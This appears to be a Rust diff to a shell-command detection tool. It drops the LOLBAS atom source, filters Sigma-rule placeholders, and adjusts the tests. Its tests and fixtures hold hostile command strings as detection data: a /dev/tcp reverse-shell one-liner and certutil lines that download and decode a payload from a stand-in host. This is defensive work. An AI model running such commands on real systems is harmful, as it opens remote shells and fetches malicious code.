@@ -42,11 +42,21 @@
 //!     substrings from every selector block. Several hundred
 //!     atoms covering credential theft / privesc / lateral
 //!     movement / persistence shapes.
-//!   - **LOLBAS** — Windows "living off the land" binaries.
-//!     Less Linux-relevant on its own but covers `wine certutil
-//!     ...` + ssh-pivot scenarios. Walks `yml/OSBinaries/`,
-//!     `yml/OSScripts/`, `yml/OSLibraries/`; extracts each
-//!     `Commands[*].Command` line.
+//!
+//! LOLBAS (Living-Off-the-Land Binaries) was a third source in
+//! earlier revisions. It was dropped because its corpus is Windows-
+//! native by definition — the project's whole reason for existing
+//! is curating Microsoft-side LOLBins. Empirically ~423 atoms were
+//! pulled from `yml/OS{Binaries,Scripts,Libraries}/`, and roughly
+//! all of them were Windows shapes (`rundll32.exe shell32.dll,
+//! Control_RunDLL {PATH_ABSOLUTE:.dll}`, `Pester.bat ;{PATH:.exe}`,
+//! `wlrmdr.exe -s 3600 -f 0 -t _ -m _ ...`). None ever fire on a
+//! Linux shell line, and the documented "wine + ssh-pivot via
+//! Windows tools" rationale didn't survive contact with the real
+//! atoms. If future Windows/WSL2 support lands, recover the
+//! original fetcher + parser + tests with `git log --all -- .` on
+//! this file to find the removal commit and cherry-pick from before
+//! it.
 //!
 //! Feature-gated behind `atoms-fetch` so default builds don't
 //! pull `flate2` + `tar` + `serde_yaml`.
@@ -63,13 +73,11 @@ pub enum SourceId {
     /// SigmaHQ Linux rule corpus — extracts `CommandLine|contains`
     /// substrings from `rules/linux/**.yml`. Several hundred atoms
     /// covering credential theft, privilege escalation, lateral
-    /// movement, persistence shapes.
+    /// movement, persistence shapes. Placeholder atoms (Sigma rule
+    /// authoring convention like `/path/to/output-file` or
+    /// `{PATH:.exe}`) get filtered at extract time — see
+    /// `is_placeholder_atom`.
     Sigma,
-    /// LOLBAS — Living-Off-the-Land Binaries. Windows-native but
-    /// useful on Linux for `wine certutil ...` detection +
-    /// ssh-pivot-via-Windows-tool scenarios. Extracts `Command`
-    /// lines from `yml/OSBinaries/*.yml`.
-    Lolbas,
 }
 
 impl SourceId {
@@ -77,7 +85,6 @@ impl SourceId {
         match s {
             "gtfobins" => Some(SourceId::Gtfobins),
             "sigma" => Some(SourceId::Sigma),
-            "lolbas" => Some(SourceId::Lolbas),
             _ => None,
         }
     }
@@ -86,14 +93,13 @@ impl SourceId {
         match self {
             SourceId::Gtfobins => "gtfobins",
             SourceId::Sigma => "sigma",
-            SourceId::Lolbas => "lolbas",
         }
     }
 
     /// All sources enabled by default. Used by the no-arg
     /// `atty-guard --update-atoms-now` form.
     pub fn default_enabled() -> &'static [SourceId] {
-        &[SourceId::Gtfobins, SourceId::Sigma, SourceId::Lolbas]
+        &[SourceId::Gtfobins, SourceId::Sigma]
     }
 }
 
@@ -252,7 +258,6 @@ mod imp {
         match source {
             SourceId::Gtfobins => fetch_gtfobins(cfg),
             SourceId::Sigma => fetch_sigma(cfg),
-            SourceId::Lolbas => fetch_lolbas(cfg),
         }
     }
 
@@ -284,18 +289,6 @@ mod imp {
         walk_tarball_atoms(&buf, is_sigma_linux_rule, extract_sigma_atoms)
     }
 
-    fn fetch_lolbas(cfg: &FetcherConfig) -> Result<Vec<String>, FetchError> {
-        // LOLBAS — Windows-native "living off the land" binaries.
-        // Linux relevance is narrower (wine, ssh-pivot scenarios)
-        // but the parser shape matches the others. Each binary
-        // YAML carries a `Commands` list of `{Command, Description,
-        // Usecase, ...}` entries; we take the `Command` strings.
-        const URL: &str =
-            "https://codeload.github.com/LOLBAS-Project/LOLBAS/tar.gz/refs/heads/master";
-        let buf = download_tarball(cfg, URL)?;
-        walk_tarball_atoms(&buf, is_lolbas_binary_yml, extract_lolbas_atoms)
-    }
-
     fn download_tarball(cfg: &FetcherConfig, url: &str) -> Result<Vec<u8>, FetchError> {
         let agent = ureq::AgentBuilder::new()
             .timeout(cfg.timeout)
@@ -305,7 +298,7 @@ mod imp {
             .get(url)
             .call()
             .map_err(|e| FetchError::NetworkError(e.to_string()))?;
-        // Sigma's tarball is ~15 MB; GTFOBins / LOLBAS are < 2 MB.
+        // Sigma's tarball is ~15 MB; GTFOBins is < 2 MB.
         // Initial capacity is just a hint — the Vec grows as needed.
         let mut buf = Vec::with_capacity(4 * 1024 * 1024);
         resp.into_reader()
@@ -383,27 +376,6 @@ mod imp {
         }
         let path_str = path.to_string_lossy();
         path_str.contains("/rules/linux/") && path_str.ends_with(".yml")
-    }
-
-    /// Layout: `LOLBAS-master/yml/{OSBinaries,OSScripts,OSLibraries,
-    /// OtherMSBinaries}/<name>.yml`. All four subdirs are
-    /// interesting — binaries are the canonical LOLBAS, scripts are
-    /// powershell/cscript dispatchers, libraries are loadable DLLs
-    /// commonly side-loaded via legitimate hosts, OtherMSBinaries
-    /// are Microsoft-shipped utilities that fall outside the OS
-    /// proper (Office runtimes, dev tools, etc.).
-    fn is_lolbas_binary_yml(path: &std::path::Path, etype: tar::EntryType) -> bool {
-        if !etype.is_file() {
-            return false;
-        }
-        let path_str = path.to_string_lossy();
-        if !path_str.ends_with(".yml") {
-            return false;
-        }
-        path_str.contains("/yml/OSBinaries/")
-            || path_str.contains("/yml/OSScripts/")
-            || path_str.contains("/yml/OSLibraries/")
-            || path_str.contains("/yml/OtherMSBinaries/")
     }
 
     /// Parse one GTFOBins markdown file's YAML front-matter and
@@ -515,33 +487,6 @@ mod imp {
         }
     }
 
-    /// Parse one LOLBAS binary YAML. The shape is:
-    /// ```text
-    /// Name: certutil
-    /// Commands:
-    ///   - Command: certutil.exe -urlcache -split -f http://...
-    ///     Description: ...
-    /// ```
-    /// Each `Command` string becomes one atom (after the standard
-    /// length + first-line rules).
-    fn extract_lolbas_atoms(content: &str, atoms: &mut BTreeSet<String>) {
-        let parsed: serde_yaml::Value = match serde_yaml::from_str(content) {
-            Ok(v) => v,
-            Err(_) => return,
-        };
-        let Some(commands) = parsed.get("Commands").and_then(|c| c.as_sequence()) else {
-            return;
-        };
-        for entry in commands {
-            let Some(cmd) = entry.get("Command").and_then(|c| c.as_str()) else {
-                continue;
-            };
-            if let Some(atom) = atom_from_code(cmd) {
-                atoms.insert(atom);
-            }
-        }
-    }
-
     /// Max atom length the GTFOBins fetcher will emit. Longer
     /// fragments are higher-signal (full perl/python reverse-shell
     /// one-liners run 100-250 chars) — keeping them is the whole
@@ -552,11 +497,12 @@ mod imp {
     const ATOM_MAX_LEN: usize = 200;
     const ATOM_MIN_LEN: usize = 3;
 
-    /// Turn a GTFOBins `code` scalar into a single atom string.
+    /// Turn a GTFOBins / Sigma `code` scalar into a single atom string.
     /// We take the first non-blank line, strip leading whitespace
-    /// (markdown YAML scalars carry indentation), and refuse
-    /// atoms below the min or above the max length (too short =
-    /// noise; too long = better suited to a regex anyway).
+    /// (markdown YAML scalars carry indentation), refuse atoms below
+    /// the min or above the max length (too short = noise; too long
+    /// = better suited to a regex anyway), and refuse placeholder-
+    /// shaped atoms (see `is_placeholder_atom`).
     fn atom_from_code(code: &str) -> Option<String> {
         for line in code.lines() {
             let t = line.trim();
@@ -574,9 +520,63 @@ mod imp {
             if clean.len() < ATOM_MIN_LEN || clean.len() > ATOM_MAX_LEN {
                 return None;
             }
+            if is_placeholder_atom(clean) {
+                return None;
+            }
             return Some(clean.to_owned());
         }
         None
+    }
+
+    /// Sigma rule authors write `CommandLine|contains` values with
+    /// rule-format placeholders like `/path/to/output-file` (any
+    /// path), `{PATH:.exe}` (any .exe path), `{PATH_ABSOLUTE:.dll}`
+    /// (any .dll absolute path), or angle-bracket templates like
+    /// `<hostname>` / `<username>`. SIEM consumers translate these
+    /// to wildcards at detection time. Aho-Corasick treats them as
+    /// literals, so they match exactly the placeholder string and
+    /// nothing else — dead weight in the automaton.
+    ///
+    /// Chain semantics are preserved: a typical Sigma rule lists
+    /// MULTIPLE substrings (e.g. `["curl ", " -o /tmp/",
+    /// "/path/to/output-file"]`), each extracted as its own atom.
+    /// Dropping the placeholder atom doesn't reduce the rule's
+    /// detection capability because the placeholder never fired
+    /// anyway — the other two literal atoms carry the signal via
+    /// V2-J multi-hit accumulation.
+    fn is_placeholder_atom(atom: &str) -> bool {
+        // Sigma directory-path placeholder convention.
+        if atom.contains("/path/to/") {
+            return true;
+        }
+        // LOLBAS-style `{PATH:.ext}` / `{PATH_ABSOLUTE:.ext}`
+        // templates also appear in some Sigma rules that derive
+        // from LOLBAS metadata.
+        if atom.contains("{PATH:") || atom.contains("{PATH_ABSOLUTE:") {
+            return true;
+        }
+        // Angle-bracket placeholders — `<hostname>`, `<user>`, `<ip>` etc.
+        // We check the FIRST `<...>` span only: if its inner is pure
+        // identifier chars (alnum / `_` / `-`), it's a placeholder.
+        // A wider sweep (e.g. first `<` to last `>`) misclassifies real
+        // shell sequences like `connect <user>@<host>` (which is
+        // genuinely a placeholder — caught here, good) but also
+        // `cmd 2>&1 < input.txt` (which isn't — caught by the "no `>`
+        // after `<`" early-out).
+        if let Some(lt) = atom.find('<') {
+            let after_lt = &atom[lt + 1..];
+            if let Some(gt_off) = after_lt.find('>') {
+                let inner = &after_lt[..gt_off];
+                if !inner.is_empty()
+                    && inner
+                        .chars()
+                        .all(|c| c.is_alphanumeric() || c == '_' || c == '-')
+                {
+                    return true;
+                }
+            }
+        }
+        false
     }
 
     /// Atomic write: tmp file in the same dir + rename. Reader
@@ -678,6 +678,32 @@ mod imp {
         }
 
         #[test]
+        fn atom_from_code_rejects_sigma_path_placeholder() {
+            // Sigma rule authoring convention — `/path/to/...` is a
+            // template literal that matches nothing in real input.
+            assert!(atom_from_code("uniq /path/to/input-file").is_none());
+            assert!(atom_from_code("emacs /path/to/output-file").is_none());
+        }
+
+        #[test]
+        fn atom_from_code_rejects_path_template_placeholders() {
+            // LOLBAS-style templates appear in Sigma rules derived
+            // from LOLBAS metadata too.
+            assert!(atom_from_code("script {PATH:.exe} arg").is_none());
+            assert!(atom_from_code("loader {PATH_ABSOLUTE:.dll}").is_none());
+        }
+
+        #[test]
+        fn atom_from_code_rejects_angle_bracket_placeholders() {
+            assert!(atom_from_code("ssh <hostname>").is_none());
+            assert!(atom_from_code("connect <user>@<host>").is_none());
+            // Real angle-bracket usage (redirection, comparison) keeps
+            // a non-identifier between the brackets — should pass.
+            assert!(atom_from_code("bash -i >& /dev/tcp/x/4444").is_some());
+            assert!(atom_from_code("cmd 2>&1 < input.txt").is_some());
+        }
+
+        #[test]
         fn extract_gtfobins_parses_canonical_yaml() {
             // Minimal example modelled after the real GTFOBins
             // front-matter shape.
@@ -737,35 +763,6 @@ detection:
         }
 
         #[test]
-        fn extract_lolbas_parses_commands_list() {
-            let doc = r#"
-Name: certutil
-Description: Downloads files
-Commands:
-  - Command: certutil.exe -urlcache -split -f http://x.com/payload
-    Description: Downloads via cert cache
-    Usecase: Download
-  - Command: certutil -decode encoded.txt decoded.exe
-    Description: base64 decode
-"#;
-            let mut atoms = BTreeSet::new();
-            extract_lolbas_atoms(doc, &mut atoms);
-            assert!(atoms
-                .iter()
-                .any(|a| a.starts_with("certutil.exe -urlcache")));
-            assert!(atoms.iter().any(|a| a.starts_with("certutil -decode")));
-        }
-
-        #[test]
-        fn extract_lolbas_handles_missing_commands() {
-            // YAML without a Commands list emits nothing.
-            let doc = "Name: certutil\nDescription: x\n";
-            let mut atoms = BTreeSet::new();
-            extract_lolbas_atoms(doc, &mut atoms);
-            assert!(atoms.is_empty());
-        }
-
-        #[test]
         fn is_sigma_linux_rule_matches_only_linux_subtree() {
             use std::path::Path;
             let f = tar::EntryType::Regular;
@@ -789,48 +786,14 @@ Commands:
         }
 
         #[test]
-        fn is_lolbas_binary_yml_covers_all_four_subdirs() {
-            use std::path::Path;
-            let f = tar::EntryType::Regular;
-            assert!(is_lolbas_binary_yml(
-                Path::new("LOLBAS-master/yml/OSBinaries/certutil.yml"),
-                f
-            ));
-            assert!(is_lolbas_binary_yml(
-                Path::new("LOLBAS-master/yml/OSScripts/cscript.yml"),
-                f
-            ));
-            assert!(is_lolbas_binary_yml(
-                Path::new("LOLBAS-master/yml/OSLibraries/comsvcs.yml"),
-                f
-            ));
-            assert!(is_lolbas_binary_yml(
-                Path::new("LOLBAS-master/yml/OtherMSBinaries/devtoolslauncher.yml"),
-                f
-            ));
-            assert!(!is_lolbas_binary_yml(
-                Path::new("LOLBAS-master/README.md"),
-                f
-            ));
-            assert!(!is_lolbas_binary_yml(
-                Path::new("LOLBAS-master/yml/index.json"),
-                f
-            ));
-        }
-
-        #[test]
         fn extractors_handle_malformed_yaml_cleanly() {
-            // Both Sigma and LOLBAS parsers must NOT panic on
-            // malformed YAML — return zero atoms via the early
-            // Err arm in `serde_yaml::from_str`.
+            // Sigma parser must NOT panic on malformed YAML — returns
+            // zero atoms via the early Err arm in `serde_yaml::from_str`.
             let mut atoms = BTreeSet::new();
             extract_sigma_atoms("not: [valid: yaml", &mut atoms);
             assert!(atoms.is_empty());
-            extract_lolbas_atoms("Commands: [not-a-list-yaml: blah:", &mut atoms);
-            assert!(atoms.is_empty());
             // Also: empty input.
             extract_sigma_atoms("", &mut atoms);
-            extract_lolbas_atoms("", &mut atoms);
             assert!(atoms.is_empty());
         }
 
@@ -918,17 +881,18 @@ mod tests {
     fn source_id_parse() {
         assert_eq!(SourceId::parse("gtfobins"), Some(SourceId::Gtfobins));
         assert_eq!(SourceId::parse("sigma"), Some(SourceId::Sigma));
-        assert_eq!(SourceId::parse("lolbas"), Some(SourceId::Lolbas));
+        // `lolbas` was removed — see module docs for the rationale.
+        assert_eq!(SourceId::parse("lolbas"), None);
         assert_eq!(SourceId::parse("unknown"), None);
         assert_eq!(SourceId::parse(""), None);
     }
 
     #[test]
-    fn default_enabled_includes_all_three_sources() {
+    fn default_enabled_includes_both_linux_sources() {
         let defaults = SourceId::default_enabled();
         assert!(defaults.contains(&SourceId::Gtfobins));
         assert!(defaults.contains(&SourceId::Sigma));
-        assert!(defaults.contains(&SourceId::Lolbas));
+        assert_eq!(defaults.len(), 2);
     }
 
     #[test]
